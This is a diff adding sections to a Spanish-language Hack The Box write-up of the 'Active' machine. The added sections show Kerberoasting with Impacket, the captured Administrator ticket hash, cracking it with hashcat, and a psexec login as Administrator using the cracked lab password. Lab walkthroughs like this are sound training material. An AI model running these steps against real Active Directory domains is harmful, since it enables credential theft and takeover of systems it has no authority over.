@@ -273,7 +273,73 @@ GPPstillStandingStrong2k18
 
 ## 5. Elevando Privilegios
 
-- Con el usuario y contraseña 
+### 5.1. Kerborasting
+
+- Con el usuario y contraseña que obtenemos podemos realizar diferentes ataques.
+- Sobre servidores con el rol de AD podemos realizar KERBEROASTING y ver si obtener credenciales.
+
+
+```
+┌──(root㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
+└─# /usr/share/doc/python3-impacket/examples/GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.126.89 -request -outputfile hashes.kerberoast
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2022-03-31 14:28:53.362933             
+
+
+
+                                                                                                                 
+┌──(root㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
+└─# cat hashes.kerberoast 
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$a0781727bd05f4255c5a9dff50412991$cc6a613afd2654efb4dfb68e25cdc74c8be20164ad3ec0280e2491fecbc07de2fe7b65c2e78737dee76b0ac5a0994f532f8cd79ba6cd45141ef637c10bc0b73cd4b023f61ee9999e10a1b69db0cd6ac1e6e4677991184d317d4a7a3d11d06dd9d7ffe40fc930c55d3dbe00f9e6e6b7110222e6ebae1d6dcf8dac67e95bb3c9eaca446dbfc83ae974f06cc8cf88f36bb72441e4e9a1968a2f1a6554f5afbb9682af10a53381b5d1c11c3e5a7e643ca199361b9057f6975d33ebde820d97f071ce424d9b26997c9f2d1091a9b52e19ea731b59ea2352545b240443acda7b320b8b3b6f92739bc54fd2a9270bc602c31527c4084982a067442b9835226ae95286deba2e672f5464f82ec30cb4aa9247aa8af0e19528f2e6d54bc98ba9d23a5c415dfcc530ac60c48002433c2867fd3563b448931f36f28eca54cef8c953ed01b06b35680c13cfdb388fb3e50408e100f481db73ea516da0898772ad00cdf653aff2fbd053ebbd8853b89bad92169a5e3190ac891986ba9e2116d26841b4698d3789e9583818248332b484d66e98d5f5bc1502a026aab6792ac348ee6ddc1159bcc08ab596e92555bd142d03687429c4e69789266a7fda46798e060057bf66a76f4750b45525c04fb4be3519214308ddd9b45a34fb163cb6ebbe62602d88ef4b04fb15cd147f25f885690e91ab5ce3854e850c75feef677722a56f229469d1e8a40caccc2005416017b41eac38fc2d825fa0b6e966057b635b7af130c21dd043e97a7bd327cc9bc2e9d4f472f81f677d58026f34768feffbd168ad92ff79b435f5c86c1fc4920a7b192290c420ba907b5d4aefe79d9569db9e0c8ed51af9010db792eeadc64dbfade5b327026d81c65250c8a361a54ed730d90216ecf8ac6d3bc8f87f772ffef5acbf137770fc205d40c5c714cb1ba97c4589c3e6fb4e8073a5103ecc5fcdac01446cd0203b8bba6c46a49aeba17e0cf8186ca6add77dddfa2ffd52b20427ad314130773908050e3b955019edd6c598effdde09ad14e0aa76b0b5753a9cbc97ba96299171e87e54eb53db24eb9eda42dab5053d06d43b98eb6539f177ff2ae805b33403858283e93b0e8e8c871364d34b27b7f62b23403a9253cf62b9182f142cfd3e42024e705db75d9ec6aff9a1dbab5554ba377d1f7c7a51e2d99317488a9a3644b9a8ba8b3fbc7e53291b365aac808a10aad1b06fdd641384cc738a23ac7cdf39e8a25365f161225ab42ec2fb8ccdbfe16d38c1
+```
+
+<img src="https://github.com/El-Palomo/Active-HTB/blob/main/Active8.jpg" width=80% />
+
+
+### 5.2. Cracking 
+
+- Utilizamos HASHCAT para realizar cracking
+
+```
+└─# hashcat -m 13100 --force -a 0 hashes.kerberoast /usr/share/wordlists/rockyou.txt                          
+```
+
+<img src="https://github.com/El-Palomo/Active-HTB/blob/main/Active9.jpg" width=80% />
+
+- Ya tenemos el usuario: Administrator y el password: Ticketmaster1968
+
+
+## 6. Accediendo remotamente
+
+```
+└─# /usr/share/doc/python3-impacket/examples/psexec.py active.htb/Administrator:Ticketmaster1968@10.129.126.89
+```
+
+<img src="https://github.com/El-Palomo/Active-HTB/blob/main/Active10.jpg" width=80% />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
